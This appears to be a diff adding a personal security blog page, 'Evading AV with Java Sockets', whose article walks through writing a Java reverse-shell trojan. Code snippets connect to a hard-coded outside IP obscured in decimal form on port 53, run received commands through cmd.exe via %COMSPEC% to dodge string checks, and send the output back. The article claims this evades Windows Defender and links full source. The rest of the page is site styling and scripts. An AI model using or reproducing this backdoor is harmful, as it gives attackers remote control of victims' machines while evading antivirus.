@@ -1,0 +1,521 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?">
+
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Evading AV with Java Sockets | Arti Karahoda</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Evading AV with Java Sockets" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Cyber Security &amp; Data Protection" />
+<meta property="og:description" content="Cyber Security &amp; Data Protection" />
+<link rel="canonical" href="https://artikrh.github.io/posts/network-sockets-revshell.html" />
+<meta property="og:url" content="https://artikrh.github.io/posts/network-sockets-revshell.html" />
+<meta property="og:site_name" content="Arti Karahoda" />
+<meta property="og:image" content="https://artikrh.github.io/assets/images/JavaSockets.png" />
+<script type="application/ld+json">
+{"@type":"WebPage","image":"https://artikrh.github.io/assets/images/JavaSockets.png","url":"https://artikrh.github.io/posts/network-sockets-revshell.html","description":"Cyber Security &amp; Data Protection","headline":"Evading AV with Java Sockets","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta property="og:type" content="article">
+    <meta property='article:author' content='Arti Karahoda'/>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes">
+    <div id="_progress"></div>
+<a id="button"></a>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+html, body {
+  overflow-x: hidden;
+}
+
+#_progress {
+      --scroll: 0%;
+      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
+      width: 100%;
+      height: 5px;
+      left: 0px;
+      right: 0px;
+      position: fixed;
+      height: 5px;
+      top:0px;
+      z-index: 100;
+  }
+
+#button {
+  display: inline-block;
+  background-color: #FF9800;
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  border-radius: 4px;
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  transition: background-color .3s, 
+    opacity .5s, visibility .5s;
+  opacity: 0;
+  visibility: hidden;
+  z-index: 1000;
+}
+#button::after {
+  content: "\f077";
+  font-family: FontAwesome;
+  font-weight: normal;
+  font-style: normal;
+  font-size: 2em;
+  line-height: 50px;
+  color: #fff;
+}
+#button:hover {
+  cursor: pointer;
+  background-color: #333;
+}
+#button:active {
+  background-color: #555;
+}
+#button.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+
+<script>
+document.addEventListener(
+  "scroll",
+  function() {
+    var scrollTop =
+      document.documentElement["scrollTop"] || document.body["scrollTop"];
+    var scrollBottom =
+      (document.documentElement["scrollHeight"] ||
+        document.body["scrollHeight"]) - document.documentElement.clientHeight;
+    scrollPercent = scrollTop / scrollBottom * 100 + "%";
+    document
+      .getElementById("_progress")
+      .style.setProperty("--scroll", scrollPercent);
+  },
+  { passive: true }
+);
+</script>
+
+<script>
+var btn = $('#button');
+
+$(window).scroll(function() {
+  if ($(window).scrollTop() > 300) {
+    btn.addClass('show');
+  } else {
+    btn.removeClass('show');
+  }
+});
+
+btn.on('click', function(e) {
+  e.preventDefault();
+  $('html, body').animate({scrollTop:0}, '300');
+});
+</script>
+    <style>
+section #title {
+  padding:0;
+}
+#nav {
+  list-style-type: none !important;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  list-style-image: none !important;
+}
+
+#nav li {
+  float: left;
+}
+
+#nav li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 8px 8px;
+  text-decoration: none;
+}
+
+#nav li a:hover {
+  background-color: #111;
+}
+
+*:focus {
+  outline:none !important
+}
+    </style>
+  <div id="_progress"></div>
+<a id="button"></a>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+html, body {
+  overflow-x: hidden;
+}
+
+#_progress {
+      --scroll: 0%;
+      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
+      width: 100%;
+      height: 5px;
+      left: 0px;
+      right: 0px;
+      position: fixed;
+      height: 5px;
+      top:0px;
+      z-index: 100;
+  }
+
+#button {
+  display: inline-block;
+  background-color: #FF9800;
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  border-radius: 4px;
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  transition: background-color .3s, 
+    opacity .5s, visibility .5s;
+  opacity: 0;
+  visibility: hidden;
+  z-index: 1000;
+}
+#button::after {
+  content: "\f077";
+  font-family: FontAwesome;
+  font-weight: normal;
+  font-style: normal;
+  font-size: 2em;
+  line-height: 50px;
+  color: #fff;
+}
+#button:hover {
+  cursor: pointer;
+  background-color: #333;
+}
+#button:active {
+  background-color: #555;
+}
+#button.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+
+<script>
+document.addEventListener(
+  "scroll",
+  function() {
+    var scrollTop =
+      document.documentElement["scrollTop"] || document.body["scrollTop"];
+    var scrollBottom =
+      (document.documentElement["scrollHeight"] ||
+        document.body["scrollHeight"]) - document.documentElement.clientHeight;
+    scrollPercent = scrollTop / scrollBottom * 100 + "%";
+    document
+      .getElementById("_progress")
+      .style.setProperty("--scroll", scrollPercent);
+  },
+  { passive: true }
+);
+</script>
+
+<script>
+var btn = $('#button');
+
+$(window).scroll(function() {
+  if ($(window).scrollTop() > 300) {
+    btn.addClass('show');
+  } else {
+    btn.removeClass('show');
+  }
+});
+
+btn.on('click', function(e) {
+  e.preventDefault();
+  $('html, body').animate({scrollTop:0}, '300');
+});
+</script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>Arti Karahoda</h1>
+          <p>Cyber Security & Data Protection</p>
+          <ul id="nav">
+              <li><a href="/">Home</a></li>
+              <li><a href="/#posts">Posts</a></li>
+              <li><a href="/#-whoami">About</a></li>
+              <li><a href="/#contact">Contact</a></li>
+            </ul>
+          <hr></div>
+
+        <style>
+.wrapper {
+  max-width: 700px;
+}
+section {
+  max-width: 700px;
+  padding: 30px 0px 0px 0px;
+}
+pre, code {
+    white-space: pre-wrap;
+}
+@media all and (max-width:480px) {
+    img {float:center;display:block;margin:0 auto;}
+}
+
+@media all and (min-width:480px) {
+    img {float:left;padding-right:30px;margin:0 auto;}
+}
+ul {
+    list-style-image: none;
+    list-style: none;
+}
+ul ul {
+    margin:0;
+}
+p + ul {
+    list-style: disc !important;
+}
+img {
+    margin-bottom:8px;
+    width: 100%;
+}
+pre, code {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+}
+.highlighter-rouge {
+    color: cyan;
+}
+body .gist .highlight {
+    background: #272822;
+}
+
+body .gist .blob-num,
+body .gist .blob-code-inner,
+body .gist .pl-s2,
+body .gist .pl-stj {
+    color: #f8f8f2;
+}
+body .gist .pl-c1 {
+    color: #ae81ff;
+}
+body .gist .pl-enti {
+    color: #a6e22e;
+    font-weight: 700;
+}
+body .gist .pl-st {
+    color: #66d9ef;
+}
+body .gist .pl-mdr {
+    color: #66d9ef;
+    font-weight: 400;
+}
+body .gist .pl-ms1 {
+    background: #fd971f;
+}
+body .gist .pl-c,
+body .gist .pl-c span,
+body .gist .pl-pdc {
+    color: #75715e;
+    font-style: italic;
+}
+body .gist .pl-cce,
+body .gist .pl-cn,
+body .gist .pl-coc,
+body .gist .pl-enc,
+body .gist .pl-ens,
+body .gist .pl-kos,
+body .gist .pl-kou,
+body .gist .pl-mh .pl-pdh,
+body .gist .pl-mp,
+body .gist .pl-mp1 .pl-sf,
+body .gist .pl-mq,
+body .gist .pl-pde,
+body .gist .pl-pse,
+body .gist .pl-pse .pl-s2,
+body .gist .pl-mp .pl-s3,
+body .gist .pl-smi,
+body .gist .pl-stp,
+body .gist .pl-sv,
+body .gist .pl-v,
+body .gist .pl-vi,
+body .gist .pl-vpf,
+body .gist .pl-mri,
+body .gist .pl-va,
+body .gist .pl-vpu {
+    color: #66d9ef;
+}
+body .gist .pl-cos,
+body .gist .pl-ml,
+body .gist .pl-pds,
+body .gist .pl-s,
+body .gist .pl-s1,
+body .gist .pl-sol {
+    color: #e6db74;
+}
+body .gist .pl-e,
+body .gist .pl-ef,
+body .gist .pl-en,
+body .gist .pl-enf,
+body .gist .pl-enm,
+body .gist .pl-entc,
+body .gist .pl-entm,
+body .gist .pl-eoac,
+body .gist .pl-eoac .pl-pde,
+body .gist .pl-eoi,
+body .gist .pl-mai .pl-sf,
+body .gist .pl-mm,
+body .gist .pl-pdv,
+body .gist .pl-som,
+body .gist .pl-sr,
+body .gist .pl-vo {
+    color: #a6e22e;
+}
+body .gist .pl-ent,
+body .gist .pl-eoa,
+body .gist .pl-eoai,
+body .gist .pl-eoai .pl-pde,
+body .gist .pl-k,
+body .gist .pl-ko,
+body .gist .pl-kolp,
+body .gist .pl-mc,
+body .gist .pl-mr,
+body .gist .pl-ms,
+body .gist .pl-s3,
+body .gist .pl-smc,
+body .gist .pl-smp,
+body .gist .pl-sok,
+body .gist .pl-sra,
+body .gist .pl-src,
+body .gist .pl-sre {
+    color: #f92672;
+}
+body .gist .pl-mb,
+body .gist .pl-pdb {
+    color: #e6db74;
+    font-weight: 700;
+}
+body .gist .pl-mi,
+body .gist .pl-pdi {
+    color: #f92672;
+    font-style: italic;
+}
+body .gist .pl-pdc1,
+body .gist .pl-scp {
+    color: #ae81ff;
+}
+body .gist .pl-sc,
+body .gist .pl-sf,
+body .gist .pl-mo,
+body .gist .pl-entl {
+    color: #fd971f;
+}
+body .gist .pl-mi1,
+body .gist .pl-mdht {
+    color: #a6e22e;
+    background: rgba(0, 64, 0, .5);
+}
+body .gist .pl-md,
+body .gist .pl-mdhf {
+    color: #f92672;
+    background: rgba(64, 0, 0, .5);
+}
+body .gist .pl-mdh,
+body .gist .pl-mdi {
+    color: #a6e22e;
+    font-weight: 400;
+}
+body .gist .pl-ib,
+body .gist .pl-id,
+body .gist .pl-ii,
+body .gist .pl-iu {
+    background: #a6e22e;
+    color: #272822;
+}
+
+</style>
+
+<p><i><strong>06 August, 2020</strong> — <a href="../">Go back to homepage</a></i></p>
+<h1 id="evading-av-with-network-sockets--java-se">Evading AV with Network Sockets / Java SE</h1>
+
+<p>RAT trojans typically use WinAPI functions for injecting malicious shellcode in memory (RAM) which is then executed. While there are numerous methods of evading anti-malware or EDR solutions for such RATs that reside in disk using techniques such as partial code encryption, they can still be caught during runtime as a result of vendors using behaviour analysis through machine learning for exploit prevention. Such controlls are difficult to bypass, however, instead of leveraging WinAPI calls, sometimes simplicity is key.</p>
+
+<p>A network socket is an endpoint of a two-way communication (TCP or UDP), identified by an IP address and a port number, which is used to send or receive data within a node on a computer network (could be LAN, WAN). They have a wide range of use cases, usually in a client-server architecture such as basic chat applications. A lot of programming languages implement libraries for programming sockets, and in this case, I will be using Java considering that it can be complied to bytecode in almost all operating systems which have JVM. Furthermore, its compile logic makes most of the Java applications seem legitimate, such as our case in programming a RAT trojan with a simple keylogging capability.</p>
+
+<p>Unfortunately, in comparison with Python, Java requires more lines of code for using sockets. For demonstration purposes, I will be using one of my VPS servers as the listener IP address of <code class="highlighter-rouge">91.92.136.11</code>, which can be written in decimal format as <code class="highlighter-rouge">"1532790795"</code> thanks to <a href="https://github.com/C-REMO/Obscure-IP-Obfuscator">IP-Obfuscator.py</a>:</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">Socket</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Socket</span><span class="o">(</span><span class="s">"1532790795"</span><span class="o">,</span> <span class="mi">53</span><span class="o">);</span></code></pre></figure>
+
+<p>This will initiate a communication channel with the CNC server, so you need a listener program such as netcat (for the sake of demonstration) operating in port 53 – a common port found in malware as it is mainly allowed in firewalls and typically not scrutinized enough from a security perspective. Sockets in Java also require input and output streams for basic I/O operations, as well as <code class="highlighter-rouge">PrintWriter()</code> and <code class="highlighter-rouge">BufferedReader()</code> to properly write outward data.</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">InputStream</span> <span class="n">i</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+<span class="nc">OutputStream</span> <span class="n">o</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+<span class="nc">PrintWriter</span> <span class="n">pw</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrintWriter</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+<span class="nc">BufferedReader</span> <span class="n">rr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">i</span><span class="o">));</span></code></pre></figure>
+
+<p>Since our target OS is Windows, we will use the <code class="highlighter-rouge">%COMSPEC</code> environment variable which simply points to <code class="highlighter-rouge">C:\WINDOWS\system32\cmd.exe</code> – useful in bypassing string-referenced checks – to execute incoming data from a non-empty buffer:</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">String</span> <span class="n">inc</span><span class="o">,</span> <span class="n">comSpec</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">"comSpec"</span><span class="o">)</span> <span class="o">+</span> <span class="s">" /c "</span><span class="o">;</span>
+
+<span class="k">while</span><span class="o">(</span><span class="kc">true</span><span class="o">){</span>
+    <span class="k">if</span><span class="o">((</span><span class="n">inc</span> <span class="o">=</span> <span class="n">rr</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
+        <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">comSpec</span> <span class="o">+</span> <span class="n">inc</span><span class="o">);</span>
+        <span class="nc">Scanner</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">sc</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="n">pw</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sc</span><span class="o">.</span><span class="na">nextLine</span><span class="o">());</span>
+        <span class="n">pw</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+        <span class="n">sc</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>We will also use the Path object to send the current working directory before command output for readability and convenience. The full source code is as follows:</p>
+
+<script src="https://gist.github.com/artikrh/fb4b51a99d5c7fb1f0ea4339c76bec39.js"></script>
+
+<p>Compiling this Java program into a Windows Excecutable comprises of convering <code class="highlighter-rouge">.jar</code> to <code class="highlighter-rouge">.exe</code> using <a href="https://stackoverflow.com/questions/2011664/compiling-a-java-program-into-an-executable">various tools</a>, however, I will be using the IntelliJ IDE to <a href="https://www.youtube.com/watch?v=_KHCHiH2RZ0">directly build a binary artifact</a> and run the program with a fully up-to-date Windows Defender:</p>
+
+<p><img src="/assets/images/JavaSockets.png" alt="Proof of Concept" /></p>
+
+<p><i><b>Disclaimer:</b> Usage of this application for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. I assume no liability and I am not responsible for any misuse or damage caused.</i></p>
+
+<p><i><a href="../">Go back to homepage</a></i></p>
+
+
+      </section>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-151966598-1', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
